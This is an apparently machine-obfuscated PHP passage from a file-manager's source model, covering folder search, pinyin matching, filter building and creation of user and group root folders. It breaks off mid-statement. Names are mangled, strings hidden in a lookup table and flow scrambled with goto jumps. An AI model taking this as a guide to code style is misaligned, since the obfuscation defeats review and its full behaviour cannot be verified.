$Dª¶…¬Ã‹ñ[$eë¼ÓĞ‡½ğ[456]]); unset($FÙ™èïõ²ñ[$eë¼ÓĞ‡½ğ[28]]); goto BŞÏĞï‹ß•; CÀ™ÔÃ†›ö: } private function _listSearchTag(&$EŠ‰ŞÈ§…µ, $F§ÅŠä¾”, $EË³“ãÆ©) { goto dÒŒå¿…; CŸ Ÿ¾¥Â: if (!$c¥‘øœá’) { return; } $DçØ§Ïİ´ñ = array($A„ÄšÄ˜×[428] => array($A„ÄšÄ˜×[7], $c¥‘øœá’), $A„ÄšÄ˜×[1529] => USER_ID); $DĞ¼µ¥ˆ×‹ = Model($A„ÄšÄ˜×[429])->field($A„ÄšÄ˜×[76])->where($DçØ§Ïİ´ñ)->select(); goto a¢Ç³ŞŒË; dÒŒå¿…: $A„ÄšÄ˜× =& $_SERVER[«¾°Ã¤]; if (!$F§ÅŠä¾”[$A„ÄšÄ˜×[1776]] || $EŠ‰ŞÈ§…µ[$A„ÄšÄ˜×[364]][$A„ÄšÄ˜×[351]] > 1) { return; } $A¿ªªÎ²× = Model($A„ÄšÄ˜×[1937])->listData(); goto EÜŞÕ ´ê; a¢Ç³ŞŒË: $DĞ¼µ¥ˆ×‹ = array_to_keyvalue($DĞ¼µ¥ˆ×‹, $A„ÄšÄ˜×[33], $A„ÄšÄ˜×[76]); $d¼…öŸŸé = array_unique($DĞ¼µ¥ˆ×‹); $this->_listSearchMerge($EŠ‰ŞÈ§…µ, $F§ÅŠä¾”, $EË³“ãÆ©, $d¼…öŸŸé); goto C¢ÉÈòãá; EÜŞÕ ´ê: $c¥‘øœá’ = array(); $D¬¨©Òãªù = $F§ÅŠä¾”[$A„ÄšÄ˜×[1776]]; foreach ($A¿ªªÎ²× as $E•ô¤¼¢) { $d©£ä…¦ïá = $E•ô¤¼¢[$A„ÄšÄ˜×[28]]; $bÌöÓù÷ìË = str_replace($A„ÄšÄ˜×[50], $A„ÄšÄ˜×[33], Pinyin::encode($d©£ä…¦ïá)); if (stripos($d©£ä…¦ïá, $D¬¨©Òãªù) !== !1 || stripos($bÌöÓù÷ìË, $D¬¨©Òãªù) !== !1) { $c¥‘øœá’[] = $E•ô¤¼¢[$A„ÄšÄ˜×[393]]; } } goto CŸ Ÿ¾¥Â; C¢ÉÈòãá: } private function _listSearchDesc(&$B„‚»Ç›¡…, $a‰ìù²·Œ, $BÔ°·ßÒŠ³) { goto bĞ¹äĞ¨”; e’·±’”ã: $eöãÓ¨¹ËÕ = Model($d¢Ù¦é„É‚[541])->field($d¢Ù¦é„É‚[404])->where($bé©‘ˆÔñğ)->select(); $E÷Ï¡šàæÎ = array_to_keyvalue($eöãÓ¨¹ËÕ, $d¢Ù¦é„É‚[33], $d¢Ù¦é„É‚[404]); $this->_listSearchMerge($B„‚»Ç›¡…, $a‰ìù²·Œ, $BÔ°·ßÒŠ³, $E÷Ï¡šàæÎ); goto F×¾ˆ¨Î; bĞ¹äĞ¨”: $d¢Ù¦é„É‚ =& $_SERVER[«¾°Ã¤]; if (!$a‰ìù²·Œ[$d¢Ù¦é„É‚[1776]] || $B„‚»Ç›¡…[$d¢Ù¦é„É‚[364]][$d¢Ù¦é„É‚[351]] > 1) { return; } $FÄ±ÖÄÇù = $this->listSearchChildren($a‰ìù²·Œ[$d¢Ù¦é„É‚[487]]); goto fí¥‚£ºË³; fí¥‚£ºË³: $FÄ±ÖÄÇù = array_unique($FÄ±ÖÄÇù); if (!$FÄ±ÖÄÇù) { return; } $bé©‘ˆÔñğ = array($d¢Ù¦é„É‚[404] => array($d¢Ù¦é„É‚[7], $FÄ±ÖÄÇù), $d¢Ù¦é„É‚[93] => $d¢Ù¦é„É‚[440], $d¢Ù¦é„É‚[372] => array($d¢Ù¦é„É‚[380], $d¢Ù¦é„É‚[1778] . $a‰ìù²·Œ[$d¢Ù¦é„É‚[1776]] . $d¢Ù¦é„É‚[1778])); goto e’·±’”ã; F×¾ˆ¨Î: } private function _listSearchGroupTag(&$C ©Ïƒ¯†ø, $eÇ¼„´öì, $f‘ÓéˆÁâÔ) { goto cº“‹¹Àæ; C‘ÚƒÂ´º: $d’øâ¶¾’® = array(); $Aø¾ãİ†ß = $eÇ¼„´öì[$CÔ·š¨Ç•´[1776]]; foreach ($Aó”¢±†êŒ[$CÔ·š¨Ç•´[367]] as $dª»ø¹Ú£) { $E“Œ©¦ˆóØ = $dª»ø¹Ú£[$CÔ·š¨Ç•´[28]]; $b¾ğ¤¸¹­Ö = str_replace($CÔ·š¨Ç•´[50], $CÔ·š¨Ç•´[33], Pinyin::encode($E“Œ©¦ˆóØ)); if (stripos($E“Œ©¦ˆóØ, $Aø¾ãİ†ß) !== !1 || stripos($b¾ğ¤¸¹­Ö, $Aø¾ãİ†ß) !== !1) { $d’øâ¶¾’®[] = $dª»ø¹Ú£[$CÔ·š¨Ç•´[393]]; } } goto CÜÅÊº•¢Á; cÌ”ÜÀ¬¨¦: $cÒòµäÚ…œ = array_to_keyvalue($cÒòµäÚ…œ, $CÔ·š¨Ç•´[33], $CÔ·š¨Ç•´[76]); $DòÙ·Å®º = array_unique($cÒòµäÚ…œ); $this->_listSearchMerge($C ©Ïƒ¯†ø, $eÇ¼„´öì, $f‘ÓéˆÁâÔ, $DòÙ·Å®º); goto B‚ª™Ø÷°; CÜÅÊº•¢Á: if (!$d’øâ¶¾’®) { return; } $fÍƒ‹¥Ÿ = array($CÔ·š¨Ç•´[428] => array($CÔ·š¨Ç•´[7], $d’øâ¶¾’®), $CÔ·š¨Ç•´[1529] => 0, $CÔ·š¨Ç•´[29] => $CÔ·š¨Ç•´[1800] . $e­Ğª¤œ¨); $cÒòµäÚ…œ = Model($CÔ·š¨Ç•´[429])->field($CÔ·š¨Ç•´[76])->where($fÍƒ‹¥Ÿ)->select(); goto cÌ”ÜÀ¬¨¦; f¤³é“ÁåĞ: if (!$Fˆ“åóƒØ || $Fˆ“åóƒØ[$CÔ·š¨Ç•´[413]] != SourceModel::TYPE_GROUP) { return; } $e­Ğª¤œ¨ = $Fˆ“åóƒØ[$CÔ·š¨Ç•´[493]]; $Aó”¢±†êŒ = Model($CÔ·š¨Ç•´[1938])->get($e­Ğª¤œ¨); goto C‘ÚƒÂ´º; cº“‹¹Àæ: $CÔ·š¨Ç•´ =& $_SERVER[«¾°Ã¤]; if (!$eÇ¼„´öì[$CÔ·š¨Ç•´[1776]] || $C ©Ïƒ¯†ø[$CÔ·š¨Ç•´[364]][$CÔ·š¨Ç•´[351]] > 1 || !$eÇ¼„´öì[$CÔ·š¨Ç•´[487]]) { return; } $Fˆ“åóƒØ = $this->sourceInfo($eÇ¼„´öì[$CÔ·š¨Ç•´[487]]); goto f¤³é“ÁåĞ; B‚ª™Ø÷°: } private function _listSearchMerge(&$F™¦­ÚíÓ, $F¥ÄÉù§¼ö, $BñØÜ‹¨‹, $D×Ÿäæóéã) { goto Cåƒôœ´·; Cåƒôœ´·: $dµ ‡Ô¿¤‘ =& $_SERVER[«¾°Ã¤]; if (!$D×Ÿäæóéã) { return; } $C…«›ì³õƒ = array_to_keyvalue($F™¦­ÚíÓ[$dµ ‡Ô¿¤‘[367]], $dµ ‡Ô¿¤‘[33], $dµ ‡Ô¿¤‘[404]); goto B‚ªğ“ÎÅ; B‚ªğ“ÎÅ: $A×”½°ÔÔ = array_diff($D×Ÿäæóéã, $C…«›ì³õƒ); if (!$A×”½°ÔÔ) { return; } $DÁ›š¿”ŞĞ = array($dµ ‡Ô¿¤‘[404] => array($dµ ‡Ô¿¤‘[7], $A×”½°ÔÔ)); goto AĞºĞƒ®ó; a³—ğå™¡Û: foreach ($aÌÈíÍÑóŸ as $eÇ¯ŒÆ¯) { if ($this->_listSearchFilter($eÇ¯ŒÆ¯, $F¥ÄÉù§¼ö)) { $bÇ¼½Şš‹ [] = $eÇ¯ŒÆ¯; } } $F™¦­ÚíÓ[$dµ ‡Ô¿¤‘[367]] = array_merge($bÇ¼½Şš‹ , $F™¦­ÚíÓ[$dµ ‡Ô¿¤‘[367]]); $F™¦­ÚíÓ[$dµ ‡Ô¿¤‘[364]][$dµ ‡Ô¿¤‘[365]] += count($bÇ¼½Şš‹ ); goto Bãˆ²¹´¶ğ; AĞºĞƒ®ó: $aÌÈíÍÑóŸ = $this->field($BñØÜ‹¨‹)->where($DÁ›š¿”ŞĞ)->select(); if (!$aÌÈíÍÑóŸ) { return; } $bÇ¼½Şš‹  = array(); goto a³—ğå™¡Û; Bãˆ²¹´¶ğ: } private function _listSearchFilter($C¢í²Ìä¾‡, $dÊ‘ŸËŞè‰) { goto A¸áš¤ŠÎà; CÚ¾«ôóçƒ: if (isset($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[414]]) && $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[414]] != $DìÎˆ¬°”[1743]) { if ($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[414]] == $DìÎˆ¬°”[77] && !$Dµ…×ó†Ÿê) { return !1; } if ($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[414]] != $DìÎˆ¬°”[77] && $Dµ…×ó†Ÿê) { return !1; } if (!strstr($C¢í²Ìä¾‡[$DìÎˆ¬°”[168]], $DìÎˆ¬°”[47] . $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[414]] . $DìÎˆ¬°”[47])) { return !1; } } if (isset($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[1939]]) && $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[1939]] < $C¢í²Ìä¾‡[$DìÎˆ¬°”[78]]) { return !1; } if (isset($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[1940]]) && $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[1940]] > $C¢í²Ìä¾‡[$DìÎˆ¬°”[78]]) { return !1; } goto eœŒÚåŸÓÄ; eœŒÚåŸÓÄ: if (isset($dÊ‘ŸËŞè‰[$DìÎˆ¬°”[571]]) && $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[571]] != $C¢í²Ìä¾‡[$DìÎˆ¬°”[443]]) { return !1; } return !0; goto c¼™Ä‡—Ö¾; A¸áš¤ŠÎà: $DìÎˆ¬°” =& $_SERVER[«¾°Ã¤]; $Dµ…×ó†Ÿê = $C¢í²Ìä¾‡[$DìÎˆ¬°”[412]] == $DìÎˆ¬°”[87]; if (!strstr($C¢í²Ìä¾‡[$DìÎˆ¬°”[496]], $DìÎˆ¬°”[47] . $dÊ‘ŸËŞè‰[$DìÎˆ¬°”[487]] . $DìÎˆ¬°”[47])) { return !1; } goto CÚ¾«ôóçƒ; c¼™Ä‡—Ö¾: } public function listSearchChildren($C³ö±—§ãì, $Eº‡ö·• = 5000) { goto bÉÀøù˜ƒâ; eî‡‹¶À•¥: $fğŒÃ¹ÜÛÄ = $this->field($AÙ±İ¶ºí[404])->where($dö¿åøéÆÄ)->select(); $fÄØªø = array_to_keyvalue($fğŒÃ¹ÜÛÄ, $AÙ±İ¶ºí[33], $AÙ±İ¶ºí[404]); return $fÄØªø; goto B¼¿ò¬‚¸î; FîÔ»Ä¡: $dö¿åøéÆÄ = array($AÙ±İ¶ºí[496] => array($AÙ±İ¶ºí[380], $eÆö¸‚ó¹Û[$AÙ±İ¶ºí[496]] . $eÆö¸‚ó¹Û[$AÙ±İ¶ºí[404]] . $AÙ±İ¶ºí[522])); $a¨„ºÂ‰íç = $this->field($AÙ±İ¶ºí[404])->cache(null, 600)->where($dö¿åøéÆÄ)->count(); if ($a¨„ºÂ‰íç > $Eº‡ö·•) { return $this->_listSearchChildrenNear($C³ö±—§ãì, $Eº‡ö·•); } goto eî‡‹¶À•¥; bÉÀøù˜ƒâ: $AÙ±İ¶ºí =& $_SERVER[«¾°Ã¤]; $fÄØªø = array(); $eÆö¸‚ó¹Û = $this->sourceInfo($C³ö±—§ãì); goto FîÔ»Ä¡; B¼¿ò¬‚¸î: } private function _listSearchChildrenNear($A«Ö¨ÚÈò“, $a–äŠÜºó) { goto eŠŠŠâš­Ó; eŠŠŠâš­Ó: $b…¸ŒÂ‰í´ =& $_SERVER[«¾°Ã¤]; $c¡¡£®Õ = array(); $f²¤»Û‰õ = array($b…¸ŒÂ‰í´[487] => $A«Ö¨ÚÈò“); goto d‘ÆØàÙõÍ; d‘ÆØàÙõÍ: $A¾ÌÔÁ–ğµ = $this->field($b…¸ŒÂ‰í´[1941])->where($f²¤»Û‰õ)->select(); $e„‰Ÿ§Ùó = array_to_keyvalue(array_filter_by_field($A¾ÌÔÁ–ğµ, $b…¸ŒÂ‰í´[412], $b…¸ŒÂ‰í´[87]), $b…¸ŒÂ‰í´[33], $b…¸ŒÂ‰í´[404]); $c¡¡£®Õ = array_merge($c¡¡£®Õ, array_to_keyvalue($A¾ÌÔÁ–ğµ, $b…¸ŒÂ‰í´[33], $b…¸ŒÂ‰í´[404])); goto d…ˆÃˆ×öä; c™‚”™’”ã: $c¡¡£®Õ = array_merge($c¡¡£®Õ, array_to_keyvalue($A¾ÌÔÁ–ğµ, $b…¸ŒÂ‰í´[33], $b…¸ŒÂ‰í´[404])); $c¡¡£®Õ = array_slice($c¡¡£®Õ, 0, $a–äŠÜºó); return $c¡¡£®Õ; goto dÜŸè”ğóË; d…ˆÃˆ×öä: if (!$e„‰Ÿ§Ùó) { return $c¡¡£®Õ; } $f²¤»Û‰õ = array($b…¸ŒÂ‰í´[487] => array($b…¸ŒÂ‰í´[7], $e„‰Ÿ§Ùó)); $A¾ÌÔÁ–ğµ = $this->field($b…¸ŒÂ‰í´[1941])->where($f²¤»Û‰õ)->limit($a–äŠÜºó)->select(); goto c™‚”™’”ã; dÜŸè”ğóË: } private function _listSearchBindPinyin($aè¾Ü†¬®„, &$Då˜‡ÛÔêŒ, &$bæÈ”’´‚ë) { goto bæØ‡Á…‰Ô; Cº˜Ò‰ò½…: foreach ($Då˜‡ÛÔêŒ as $aÂÙÙô­±Ë => $D•†òîÊ) { $EĞß‡ï õ[$dƒ¿ˆ¤à†¤[1943] . $aÂÙÙô­±Ë] = $D•†òîÊ; } foreach ($ešæ ÂâŠò as $AŒó©ïë†ï) { $EĞß‡ï õ[] = array($dƒ¿ˆ¤à†¤[1945] => $AŒó©ïë†ï, $dƒ¿ˆ¤à†¤[958] => $dƒ¿ˆ¤à†¤[1780], array($dƒ¿ˆ¤à†¤[1946] => $AŒó©ïë†ï, $dƒ¿ˆ¤à†¤[1947] => array($dƒ¿ˆ¤à†¤[7], array($dƒ¿ˆ¤à†¤[453], $dƒ¿ˆ¤à†¤[452])))); } $this->join($bíØïå´Ã); goto aäŠ¯ÙÊÙ¯; eê¿â‚…äÍ: $bíØïå´Ã = "\114\105\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\151\157\x5f\x73\x6f\x75\162\x63\145\137\155\x65\164\141\x20\x6d\x65\164\x61\x20\157\156\x20\163\157\165\x72\x63\x65\x2e\163\x6f\x75\162\143\145\x49\104\40\75\40\x6d\x65\164\x61\56\163\157\165\162\143\145\111\x44"; $EĞß‡ï õ = array(); $bæÈ”’´‚ë = str_replace(array($dƒ¿ˆ¤à†¤[229], $dƒ¿ˆ¤à†¤[50], $dƒ¿ˆ¤à†¤[1942]), $dƒ¿ˆ¤à†¤[33], $bæÈ”’´‚ë); goto bì™ÈíÙº; bæØ‡Á…‰Ô: $dƒ¿ˆ¤à†¤ =& $_SERVER[«¾°Ã¤]; if (!isset($aè¾Ü†¬®„[$dƒ¿ˆ¤à†¤[1776]]) || !$aè¾Ü†¬®„[$dƒ¿ˆ¤à†¤[1776]]) { return; } if (!Input::check($aè¾Ü†¬®„[$dƒ¿ˆ¤à†¤[1776]], $dƒ¿ˆ¤à†¤[316]) || strlen($aè¾Ü†¬®„[$dƒ¿ˆ¤à†¤[1776]]) < 2) { return; } goto eê¿â‚…äÍ; bì™ÈíÙº: $bæÈ”’´‚ë = $dƒ¿ˆ¤à†¤[1943] . str_replace($dƒ¿ˆ¤à†¤[47], $dƒ¿ˆ¤à†¤[1944], $bæÈ”’´‚ë); $ešæ ÂâŠò = $Då˜‡ÛÔêŒ[$dƒ¿ˆ¤à†¤[28]]; unset($Då˜‡ÛÔêŒ[$dƒ¿ˆ¤à†¤[28]]); goto Cº˜Ò‰ò½…; aäŠ¯ÙÊÙ¯: $Då˜‡ÛÔêŒ = $EĞß‡ï õ; goto D‰ÄÜ•İˆ±; D‰ÄÜ•İˆ±: } private function _parseSearchWhere($bùŠ…ÛŸ¬­) { goto Cˆ”©ÈêÖ; a»ß°Ã‰İ: if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[571]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[571]]) { $d×»»äŞ®œ[] = array($D°Ãé©‡¿¢[443] => $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[571]], $D°Ãé©‡¿¢[441] => $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[571]], $D°Ãé©‡¿¢[958] => $D°Ãé©‡¿¢[1780]); } if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[414]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[414]]) { $CÊÛöÁ¦‚ó = $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[414]]; if ($CÊÛöÁ¦‚ó == $D°Ãé©‡¿¢[77]) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[412]] = 1; } else { if ($CÊÛöÁ¦‚ó == $D°Ãé©‡¿¢[1951]) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[412]] = 0; } else { if ($CÊÛöÁ¦‚ó) { $CÊÛöÁ¦‚ó = is_array($CÊÛöÁ¦‚ó) ? $CÊÛöÁ¦‚ó : explode($D°Ãé©‡¿¢[47], $CÊÛöÁ¦‚ó); $d×»»äŞ®œ[$D°Ãé©‡¿¢[414]] = array($D°Ãé©‡¿¢[420], $CÊÛöÁ¦‚ó); $d×»»äŞ®œ[$D°Ãé©‡¿¢[412]] = 0; } } } } if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[487]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[487]]) { $eï¦à²ß‘½ = $this->sourceInfo($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[487]]); $d×»»äŞ®œ[$D°Ãé©‡¿¢[562]] = array($D°Ãé©‡¿¢[521], $eï¦à²ß‘½[$D°Ãé©‡¿¢[496]] . $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[487]] . $D°Ãé©‡¿¢[522]); } goto c›ÜÓãÌİ‚; Cˆ”©ÈêÖ: $D°Ãé©‡¿¢ =& $_SERVER[«¾°Ã¤]; $d×»»äŞ®œ = array(); if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[730]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[730]]) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[84]] = array($D°Ãé©‡¿¢[1948], $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[730]]); } goto cªÛ‰¥•ã; cªÛ‰¥•ã: if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[485]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[485]]) { $b‡ê—ôó„ˆ = array($D°Ãé©‡¿¢[1949], $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[485]]); if ($d×»»äŞ®œ[$D°Ãé©‡¿¢[84]]) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[84]] = array($d×»»äŞ®œ[$D°Ãé©‡¿¢[84]], $b‡ê—ôó„ˆ, $D°Ãé©‡¿¢[1950]); } else { $d×»»äŞ®œ[$D°Ãé©‡¿¢[84]] = $b‡ê—ôó„ˆ; } } if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1939]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1939]] > 0) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[78]] = array($D°Ãé©‡¿¢[1948], $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1939]]); } if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1940]]) && $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1940]]) { $b‡ê—ôó„ˆ = array($D°Ãé©‡¿¢[1949], $bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1940]]); if ($d×»»äŞ®œ[$D°Ãé©‡¿¢[78]]) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[78]] = array($d×»»äŞ®œ[$D°Ãé©‡¿¢[78]], $b‡ê—ôó„ˆ, $D°Ãé©‡¿¢[1950]); } else { $d×»»äŞ®œ[$D°Ãé©‡¿¢[78]] = $b‡ê—ôó„ˆ; } } goto a»ß°Ã‰İ; c›ÜÓãÌİ‚: if (isset($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1776]]) && trim($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1776]])) { $cÎÆ×Ÿ‰ = trim($bùŠ…ÛŸ¬­[$D°Ãé©‡¿¢[1776]]); $B¢à–Œô¿ä = explode($D°Ãé©‡¿¢[50], $cÎÆ×Ÿ‰); if (strlen($cÎÆ×Ÿ‰) > 2 && (substr($cÎÆ×Ÿ‰, 0, 1) == $D°Ãé©‡¿¢[116] && substr($cÎÆ×Ÿ‰, -1) == $D°Ãé©‡¿¢[116]) || substr($cÎÆ×Ÿ‰, 0, 1) == $D°Ãé©‡¿¢[55] && substr($cÎÆ×Ÿ‰, -1) == $D°Ãé©‡¿¢[55]) { $cÎÆ×Ÿ‰ = substr($cÎÆ×Ÿ‰, 1, -1); $B¢à–Œô¿ä = array($cÎÆ×Ÿ‰); } $d×»»äŞ®œ[$D°Ãé©‡¿¢[28]] = array(array($D°Ãé©‡¿¢[521], $D°Ãé©‡¿¢[1778] . $cÎÆ×Ÿ‰ . $D°Ãé©‡¿¢[1778])); if (count($B¢à–Œô¿ä) > 1) { $d×»»äŞ®œ[$D°Ãé©‡¿¢[28]] = array(); foreach ($B¢à–Œô¿ä as $cóÍñÈ®) { if (!trim($cóÍñÈ®)) { continue; } $d×»»äŞ®œ[$D°Ãé©‡¿¢[28]][] = array($D°Ãé©‡¿¢[521], $D°Ãé©‡¿¢[1778] . trim($cóÍñÈ®) . $D°Ãé©‡¿¢[1778]); } } } return $d×»»äŞ®œ; goto b¦„ÊÉ; b¦„ÊÉ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D«Ù¾¼ëë¼) { $Fß‰Ò¡ºÉÌ =& $_SERVER[«¾°Ã¤]; $Dš®Ó›¼Ê = Model($Fß‰Ò¡ºÉÌ[511])->where(array($Fß‰Ò¡ºÉÌ[1521] => $D«Ù¾¼ëë¼))->find(); $E¦Ú¸ÁóåÈ = $this->_mkdirRoot(SourceModel::TYPE_USER, $D«Ù¾¼ëë¼, $Dš®Ó›¼Ê[$Fß‰Ò¡ºÉÌ[28]]); $this->userDesktopAdd($E¦Ú¸ÁóåÈ); return $E¦Ú¸ÁóåÈ; } public function userDesktopAdd($D¸¥²ã¿) { $FµùŸ»¿Ÿõ =& $_SERVER[«¾°Ã¤]; $CÙˆÎŞŸ¡ç = LNG($FµùŸ»¿Ÿõ[1952]); $CÇÂ»Î™Òœ = $this->mkdir($D¸¥²ã¿, $CÙˆÎŞŸ¡ç); $this->metaSet($CÇÂ»Î™Òœ, $FµùŸ»¿Ÿõ[1953], $FµùŸ»¿Ÿõ[87]); $this->metaSet($D¸¥²ã¿, $FµùŸ»¿Ÿõ[1954], $CÇÂ»Î™Òœ); } public function groupRootAdd($f¿¸”ìÅˆ) { $D¦îøè®³¢ =& $_SERVER[«¾°Ã¤]; $D´‰æ©¿Ø = Model($D¦îøè®³¢[495])->where(array($D¦îøè®³¢[1771] => $f¿¸”ìÅˆ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f¿¸”ìÅˆ, $D´‰æ©¿Ø[$D¦îøè®³¢[28]]); } public function systemRootPathAdd($f¦‰‹÷‚È„) { if ($f¦‰‹÷‚È„ != $_SERVER[«¾°Ã¤][514]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $f¦‰‹÷‚È„); } public function userRootRemove($E×ÏôÃ‹Ãñ) { $AÌÍÏõ‡‹ = $this->sourceRoot(SourceModel::TYPE_USER, $E×ÏôÃ‹Ãñ); if (!$AÌÍÏõ‡‹) { return; } $this->remove($AÌÍÏõ‡‹, !1); } public function groupRootRemove($C”º©»”å¹) { $BÖÔÒ²µ…± = $this->sourceRoot(SourceModel::TYPE_GROUP, $C”º©»”å¹); if (!$BÖÔÒ²µ…±) { return; } $this->remove($BÖÔÒ²µ…±, !1); } private function _mkdirRoot($FñŠê‰åâ¹, $eóŒ´×Ûí, $dìğ…øÔæÇ) { goto d‡¹Æ»† ¶; fª¥¢¹Õ“Î: $C–èĞÁÓ¨¼ = "\115\157\x64\x65\154\x53\157\x75\162\143\x65\x2e\x6d\153\x64\151\162\x52\x6f\x6f\x74\x2e{$FñŠê‰åâ¹}\56{$eóŒ´×Ûí}\56" . $dìğ…øÔæÇ; CacheLock::lock($C–èĞÁÓ¨¼); $B†êæİ¹£[$cˆƒÕ¨í¥[28]] = $dìğ…øÔæÇ; goto BÓµ„¯‹Ë; CÀØ¸Í˜òö: CacheLock::unlock($C–èĞÁÓ¨¼); return $Bù‹×ğØ; goto a»ãìõ¹…Æ; BÓµ„¯‹Ë: $Bù‹×ğØ = $this->add($B†êæİ¹£); $e‘Ù©í¬Î… = array($cˆƒÕ¨í¥[564] => short_id($Bù‹×ğØ)); $this->where(array($cˆƒÕ¨í¥[419] => $Bù‹×ğØ))->save($e‘Ù©í¬Î…); goto CÀØ¸Í˜òö; d‡¹Æ»† ¶: $cˆƒÕ¨í¥ =& $_SERVER[«¾°Ã¤]; $B†êæİ¹£ = array($cˆƒÕ¨í¥[403] => 0, $cˆƒÕ¨í¥[558] => $FñŠê‰åâ¹, $cˆƒÕ¨í¥[559] => $eóŒ´×Ûí, $cˆƒÕ¨í¥[555] => 1, $cˆƒÕ¨í¥[560] => USER_ID, $cˆƒÕ¨í¥[561] => USER_ID, $cˆƒÕ¨í¥[556] => $cˆƒÕ¨í¥[33], $cˆƒÕ¨í¥[562] => $cˆƒÕ¨í¥[507], $cˆƒÕ¨í¥[431] => 0, $cˆƒÕ¨í¥[557] => 0, $cˆƒÕ¨í¥[457] => 0, $cˆƒÕ¨í¥[563] => $cˆƒÕ¨í¥[33]); if ($b«Ç°–¬î‰ = $this->where($B†êæİ¹£)->find()) { return $b«Ç°–¬î‰[$cˆƒÕ¨í¥[404]]; } goto fª¥¢¹Õ“Î; a»ãìõ¹…Æ: } private function sourceRoot($eÖ³İ¯ÃÍ, $fç¯‚æÈï¤, $BÆĞ·ñ‹ = false) { $cô³§¬”ÉÉ =& $_SERVER[«¾°Ã¤]; $aÎÜÔŞÒ· = array($cô³§¬”ÉÉ[403] => 0, $cô³§¬”ÉÉ[558] => $eÖ³İ¯ÃÍ, $cô³§¬”ÉÉ[559] => $fç¯‚æÈï¤); if ($dµ‘ÉØ–Òë = $this->where($aÎÜÔŞÒ·)->find()) { return $BÆĞ·ñ‹ ? $dµ‘ÉØ–Òë : $dµ‘ÉØ–Òë[$cô³§¬”ÉÉ[404]]; } return !1; } public function sourceRootGroup($FÃœÇÏ¯à³) { goto FÖÊ¬ÅÎŒç; FÖÊ¬ÅÎŒç: $aÖŸÀŸ =& $_SERVER[«¾°Ã¤]; if (is_string($FÃœÇÏ¯à³)) { $FÃœÇÏ¯à³ = array($FÃœÇÏ¯à³); } $Cß–ƒÈíœ… = array($aÖŸÀŸ[403] => 0, $aÖŸÀŸ[558] => SourceModel::TYPE_GROUP, $aÖŸÀŸ[559] => array($aÖŸÀŸ[7], $FÃœÇÏ¯à³)); goto fø§„öŒŒ; ešƒìá•æŠ: return array_to_keyvalue($DÊÅ‚±ªÈ¦[$aÖŸÀŸ[75]], $aÖŸÀŸ[493]); goto aøßÕÇÊ„¿; fø§„öŒŒ: $this->selectPageReset(); $DÊÅ‚±ªÈ¦ = $this->listSource($Cß–ƒÈíœ…, 1000); $this->selectPageRestore(); goto ešƒìá•æŠ; aøßÕÇÊ„¿: } public function mkfile($Aòƒ²»³Í‡, $cáÕ‹Ä‹, $B‚‹—ƒÇÒ = '', $C†ãÄµè„ = REPEAT_RENAME) { $bğêÄ·¡ÓÖ =& $_SERVER[«¾°Ã¤]; $a—šóÖ£­Í = Model($bğêÄ·¡ÓÖ[580])->addFileByContent($B‚‹—ƒÇÒ, $cáÕ‹Ä‹); return $this->_createFileCall($Aòƒ²»³Í‡, $cáÕ‹Ä‹, $a—šóÖ£­Í, $C†ãÄµè„, $bğêÄ·¡ÓÖ[1217]); } public function addFile($bØò›—â©, $FôØ†ïÒ·, $dÒèÙÙöòÔ, $E•êÒîŸ‰Ä = false, $C¼—ç‚æ± = REPEAT_RENAME) { $Cê…ÑŒôÇ = Model($_SERVER[«¾°Ã¤][580])->addFile($FôØ†ïÒ·, $dÒèÙÙöòÔ, $E•êÒîŸ‰Ä); return $this->_createFileCall($bØò›—â©, $dÒèÙÙöòÔ, $Cê…ÑŒôÇ, $C¼—ç‚æ±); } public function addFileByFileID($Dª¼ù‰Ş´©, $D¾Ùğå¹¾â, $C»õ˜¦‚‹Ü, $B˜íˆô‡Ä“ = REPEAT_RENAME) { $BÂ‚İ‚®¾Î =& $_SERVER[«¾°Ã¤]; $A¡æïÁ°˜ƒ = Model($BÂ‚İ‚®¾Î[580])->find($D¾Ùğå¹¾â); Model($BÂ‚İ‚®¾Î[580])->linkAdd($D¾Ùğå¹¾â); return 